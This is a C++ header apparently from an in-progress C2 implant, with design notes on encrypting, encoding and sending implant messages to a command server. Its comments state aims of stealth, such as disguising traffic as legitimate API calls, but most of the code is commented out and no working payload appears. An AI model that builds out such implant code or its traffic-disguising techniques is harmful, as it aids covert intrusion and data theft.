/* MessagePublisher.h (rename this later?) */ 
/* MessagePublisher.h handles all publishing of messages to server */

/* define structures of outgoing messages/packets */

// raw command/data ---> encrypt ---> encode ---> send data to server (in chunks?)

// NOTE: AES key will need to be shared via RSA key exchange or TLS handshake

// CipherText and Tag come from encryption
// IV is just some randomly generated bytes (12 bytes for aes-gcm)
// send Base64(IV + CipherText + Tag)
#ifndef MESSAGE_PUBLISHER_H
#define MESSAGE_PUBLISHER_H


#include "MessageTypes.h"

// RSA
/* NOTE: private key should only be on server
 * # Generate private key
 * openssl genpkey -algorithm RSA -out private.pem -pkeyopt rsa_keygen_bits:2048
 *
 * NOTE: public key should be embedded inside the implant
 * # Extract public key
 * openssl rsa -pubout -in private.pem -out public.pem
 *
 * NOTE: common approach is to just use one key pair
 */

/*
 * Load public key from PEM file
 */
/*
EVP_PKEY* load_public_key(const char* filename) {
	FILE *fp = fopen(filename, "r");
	if (!fp) return NULL;

	EVP_PKEY *key = PEM_read_PUBKEY(fp, NULL, NULL, NULL);
	fclose(fp);
	return key;

}*/

/*
 * TODO: this func doesn't need to be in client? move to server
 * Load private key from PEM file  
 */
/*
EVP_PKEY* load_private_key(const char* filename) {
	FILE *fp = fopen(filename, "r");
	if (!fp) return NULL;

	EVP_PKEY *key = PEM_read_PrivateKey(fp, NULL, NULL, NULL);
	fclose(fp);
	return key;
}
*/

// createHeader() ?




// TODO: eventually should use custom struct instead of json
// b64 encoding is only needed in text-only protocols (http)
// json / custom struct -> compress (if needed) -> serialize -> encrypt (+ hmac if encryption doesn't have builtin auth) -> encode -> send?

// json / custom struct -> compress (if needed) -> serialize -> encrypt (+ hmac if encryption doesn't have builtin auth) -> tlv -> send?





///////////////////////////////////////////////





// NOTE: Config is the config that comes from the C2 profile
// return non-zero on error
/*int send(InternalMessage* msg, Config* config) // TODO: def rename this function so it is more clear
{
 	// stealthier than creating a Buffer struct
	// other option would be to create multiple buffers to avoid single large allocation
	uint8_t buf = {0};

	// 1. Serialize
	serializeData(msg, &buf, config->serializationType); // TODO: check return type if there were any errors

	// 2. Compress (optional)
	// compress_if_needed(&buf, config->use_compression);
	if (config->compressData)
	{
		compressData(&buf);
	}

	// 3. Encrypt + Authenticate (GCM does both)
	aes_gcm_encrypt(&buf, config->crypto_key);

	// 4. Package with auth tag (if encryption doesn't have auth stuff?)... (TLV or encode) 
	// package_with_auth_tag(&buf, config->protocol);

	// 5. Send
	// send_data(&buf, config->server_endpoint);

	// cleanup: free buf
	return 0;
}*/

// raw binary is possible
// 	- direct tcp, tls/ssl sockets, udp, raw icmp/dns, 

// NOTE: we wrap message into json to make it more stealthy and look like a legit api / web traffic... TODO: do this once everything is working
// MessageData -> serialize into bytes -> encrypt bytes -> create InternalMessage (using header and bytes we encrypted) -> encode if needed: if raw, send direct binary bytes, but if http, then base64+json wrap -> send

class MessagePublisher
{
public:
	MessagePublisher(
		Encryptor& encryptor,
		Encoder& encoder,
		Serializer& serializer);
private:
	//MessagePublisher(const MessagePublisher&) = delete;
	//MessagePublisher& operator=(const MessagePublisher&) = delete;

	bool sendMessage(InternalMessage* msg); // should take in a reference to an InternalMessage
	Encryptor& encryptor_;
	Encoder& encoder_;
	Serializer& serializer_;
};
typedef std::unique_ptr<MessagePublisher> MessagePublisherPtr;
#endif
